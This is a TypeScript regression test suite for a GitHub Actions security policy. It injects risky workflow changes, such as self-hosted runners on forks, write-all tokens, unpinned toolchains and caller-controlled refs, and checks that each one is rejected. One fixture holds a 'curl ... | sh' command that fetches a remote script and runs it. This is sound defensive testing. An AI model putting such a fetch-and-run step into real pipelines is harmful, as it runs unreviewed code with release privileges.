/**
 * Regression tests for privileged GitHub Actions trust-boundary policy.
 *
 * The policy is fed the real repository inventory (read from the directory, not
 * a list here), so this suite also fails when a workflow is added that quietly
 * takes the self-hosted runner, a privileged trigger, or a partial vendoring
 * step — the gap MCW-V09-131 found in the previous hand-maintained table.
 */
import { describe, expect, test } from "bun:test";
import { readWorkflowSources, type WorkflowSources } from "../../scripts/workflow-inventory";
import { workflowSecurityPolicyFailures } from "../../scripts/workflow-security-policy";

const GITHUB_EXPRESSION = "$" + "{{";
const SHELL_EXPANSION = "$" + "{";

const mutate = (
  sources: WorkflowSources,
  workflow: string,
  search: string,
  replacement: string,
): WorkflowSources => {
  const source = sources[workflow] ?? "";
  expect(source).toContain(search);
  return { ...sources, [workflow]: source.replace(search, replacement) };
};

describe("workflow security policy", () => {
  test("accepts the repository workflows", async () => {
    expect(workflowSecurityPolicyFailures(await readWorkflowSources())).toEqual([]);
  });

  test("inspects every workflow on disk, not a hand-maintained list", async () => {
    const sources = await readWorkflowSources();
    // The three the previous table omitted. They are ordinary hosted workflows,
    // which is exactly why nothing noticed they were unchecked.
    for (const name of ["auto-release.yml", "terminal-ci.yml", "ui-lab.yml"]) {
      expect(Object.keys(sources)).toContain(name);
    }
  });

  test("rejects a new workflow that claims the self-hosted runner", async () => {
    const sources = await readWorkflowSources();
    const added = {
      ...sources,
      "shortcut.yml": [
        "name: Shortcut",
        "on:",
        "  push:",
        "",
        "permissions:",
        "  contents: read",
        "",
        "jobs:",
        "  run:",
        "    runs-on:",
        "      - codebuild-gha-runner-mc-wallet",
        "    steps:",
        "      - run: echo hi",
        "",
      ].join("\n"),
    };

    expect(workflowSecurityPolicyFailures(added)).toEqual([
      ".github/workflows/shortcut.yml must use a hosted runner or declare a reviewed workflow policy",
    ]);
  });

  test("rejects a new workflow that takes a privileged trigger or wide permissions", async () => {
    const sources = await readWorkflowSources();
    const added = {
      ...sources,
      "sync.yml": [
        "name: Sync",
        "on:",
        "  pull_request_target:",
        "",
        "permissions: write-all",
        "",
        "jobs:",
        "  run:",
        "    runs-on: ubuntu-latest",
        "    steps:",
        "      - run: echo hi",
        "",
      ].join("\n"),
    };

    expect(workflowSecurityPolicyFailures(added)).toEqual([
      ".github/workflows/sync.yml must declare a read-only default permissions block",
      ".github/workflows/sync.yml must not request every token permission",
      ".github/workflows/sync.yml must declare a reviewed workflow policy before using pull_request_target:",
    ]);
  });

  test("polices a workflow written with the .yaml extension", async () => {
    // GitHub runs `.yaml` workflows identically. One taking every privileged
    // capability at once must produce the same baseline failures a `.yml` one
    // would; it previously produced none because it never entered the inventory.
    const added = {
      ...(await readWorkflowSources()),
      "zz-probe.yaml": [
        "name: probe",
        "on:",
        "  pull_request_target:",
        "permissions: write-all",
        "jobs:",
        "  evil:",
        "    runs-on: self-hosted",
        "    steps:",
        "      - run: echo pwned",
        "",
      ].join("\n"),
    };

    expect(workflowSecurityPolicyFailures(added)).toEqual([
      ".github/workflows/zz-probe.yaml must declare a read-only default permissions block",
      ".github/workflows/zz-probe.yaml must not request every token permission",
      ".github/workflows/zz-probe.yaml must use a hosted runner or declare a reviewed workflow policy",
      ".github/workflows/zz-probe.yaml must declare a reviewed workflow policy before using pull_request_target:",
    ]);
  });

  test("rejects renaming a policed workflow to the other extension", async () => {
    // Renaming is how a reviewed workflow's own rules would be shed: the file
    // still runs, but under a name no named policy matches.
    const { ["nightly.yml"]: nightly, ...rest } = await readWorkflowSources();

    expect(workflowSecurityPolicyFailures({ ...rest, "nightly.yaml": nightly ?? "" })).toContain(
      ".github/workflows/nightly.yml is missing; its reviewed policy cannot be enforced",
    );
  });

  test("rejects removing a workflow whose privileged behaviour is pinned", async () => {
    const { ["nightly.yml"]: _removed, ...rest } = await readWorkflowSources();

    expect(workflowSecurityPolicyFailures(rest)).toContain(
      ".github/workflows/nightly.yml is missing; its reviewed policy cannot be enforced",
    );
  });

  const cases = [
    {
      name: "rejects fork-capable self-hosted release validation",
      workflow: "ci.yml",
      search: "github.event.pull_request.head.repo.full_name == github.repository",
      replacement: "github.event.pull_request.head.repo.full_name != ''",
      failure:
        "release-validation must reject fork-controlled branches before using the self-hosted runner",
    },
    {
      name: "rejects a moving Rust toolchain",
      workflow: "ci.yml",
      search: "toolchain: 1.96.1",
      replacement: "toolchain: stable",
      failure: ".github/workflows/ci.yml must pin Rust toolchain 1.96.1",
    },
    {
      name: "rejects exposing the Chromatic token to the whole UI job",
      workflow: "ui-lab.yml",
      search:
        "    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1",
      replacement: `    runs-on: ubuntu-latest\n    env:\n      CHROMATIC_PROJECT_TOKEN: ${GITHUB_EXPRESSION} secrets.CHROMATIC_PROJECT_TOKEN }}\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1`,
      failure:
        ".github/workflows/ui-lab.yml must reference the Chromatic token only in its scoped step environment",
    },
    {
      name: "rejects release builds without the pinned privacy SDK",
      workflow: "release-build.yml",
      search: "- run: bun run vendor:privacy",
      replacement: "- run: echo privacy-sdk-skipped",
      failure: ".github/workflows/release-build.yml must vendor the pinned privacy SDK",
    },
    {
      name: "rejects vendoring Krusty without the multisig contracts",
      workflow: "nightly.yml",
      search: "bun run vendor:krusty && bun run vendor:multisig && bun run vendor:privacy",
      replacement: "bun run vendor:krusty && bun run vendor:privacy",
      failure: ".github/workflows/nightly.yml must vendor the pinned multisig contracts",
    },
    {
      name: "rejects a moving privacy SDK build runtime",
      workflow: "nightly.yml",
      search: "node-version: 24",
      replacement: "node-version: latest",
      failure: ".github/workflows/nightly.yml must pin Node.js 24 for privacy SDK vendoring",
    },
    {
      // Pinning the Node.js release says nothing about which packages run under
      // it. A vendoring workflow that resolves an executable by name at run time
      // executes unpinned code with the release workspace's write access, before
      // any digest or package check exists to notice what it changed.
      name: "rejects an executable resolved by name in a vendoring workflow",
      workflow: "ci.yml",
      search: "      - run: bun run vendor:privacy",
      replacement: "      - run: npx some-tool\n      - run: bun run vendor:privacy",
      failure:
        ".github/workflows/ci.yml must not run `npx`: it downloads and runs whatever package currently answers that name",
    },
    {
      name: "rejects a downloaded installer piped into a shell during vendoring",
      workflow: "release-build.yml",
      search: "      - run: bun run vendor:krusty",
      replacement:
        "      - run: curl -sSf https://example.invalid/i.sh | sh\n      - run: bun run vendor:krusty",
      failure:
        ".github/workflows/release-build.yml must not run `curl -sSf https://example.invalid/i.sh | sh`: it pipes a downloaded script straight into a shell",
    },
    {
      name: "rejects an unreviewed setup-node action revision",
      workflow: "ci.yml",
      search: "actions/setup-node@820762786026740c76f36085b0efc47a31fe5020",
      replacement: "actions/setup-node@0000000000000000000000000000000000000000",
      failure: ".github/workflows/ci.yml must pin Node.js 24 for privacy SDK vendoring",
    },
    {
      name: "rejects write permission in the self-hosted release build",
      workflow: "release-build.yml",
      search: "build-release:\n    permissions:\n      contents: read",
      replacement: "build-release:\n    permissions:\n      contents: write",
      failure: "self-hosted release builds must have read-only repository permission",
    },
    {
      name: "rejects caller-controlled release checkout refs",
      workflow: "release-build.yml",
      search:
        "with:\n          fetch-depth: 0\n          fetch-tags: true\n      - name: Check out immutable release commit",
      replacement: `with:\n          ref: ${GITHUB_EXPRESSION} inputs.commit_sha }}\n          fetch-depth: 0\n          fetch-tags: true\n      - name: Check out immutable release commit`,
      failure: "self-hosted release builds must not pass caller-controlled refs to checkout",
    },
    {
      name: "rejects release publishing that executes checked-out source",
      workflow: "release-build.yml",
      search: "steps:\n      - uses: actions/download-artifact@",
      replacement:
        "steps:\n      - uses: actions/checkout@0000000000000000000000000000000000000000\n      - uses: actions/download-artifact@",
      failure: "the hosted release publisher must not check out or execute wallet source",
    },
    {
      name: "rejects manual store publishing without an immutable tag",
      workflow: "release.yml",
      search: `git ls-remote --exit-code --tags origin "refs/tags/${SHELL_EXPANSION}tag}"`,
      replacement: `git show-ref --verify "refs/heads/${SHELL_EXPANSION}tag}"`,
      failure: "manual store publication must require an existing immutable release tag",
    },
    {
      name: "rejects an unconstrained nightly branch",
      workflow: "nightly.yml",
      search: '[[ ! "$candidate" =~ ^release/v[0-9]+\\.[0-9]+$ ]]',
      replacement: '[[ -z "$candidate" ]]',
      failure: "nightly must constrain configured refs to canonical release branches",
    },
    {
      name: "rejects configured nightly checkout refs",
      workflow: "nightly.yml",
      search:
        "uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n      - name: Check out resolved release commit",
      replacement: `uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          ref: ${GITHUB_EXPRESSION} needs.resolve.outputs.branch }}\n      - name: Check out resolved release commit`,
      failure: "self-hosted nightly execution must not pass configured refs to checkout",
    },
    {
      name: "rejects pull-request execution with the roadmap token",
      workflow: "roadmap-project-sync.yml",
      search: "pull_request_target:",
      replacement: "pull_request:",
      failure: "roadmap token verification must execute the trusted base workflow",
    },
    {
      name: "rejects self-hosted release integration on a pull request",
      workflow: "release-integration.yml",
      search: 'push:\n    branches: ["release/**"]',
      replacement: "pull_request:\n    branches: [main]",
      failure: "release integration must run only on pushes to release branches",
    },
  ] as const;

  for (const item of cases) {
    test(item.name, async () => {
      const sources = await readWorkflowSources();
      const changed = mutate(sources, item.workflow, item.search, item.replacement);
      expect(workflowSecurityPolicyFailures(changed)).toContain(item.failure);
    });
  }
});
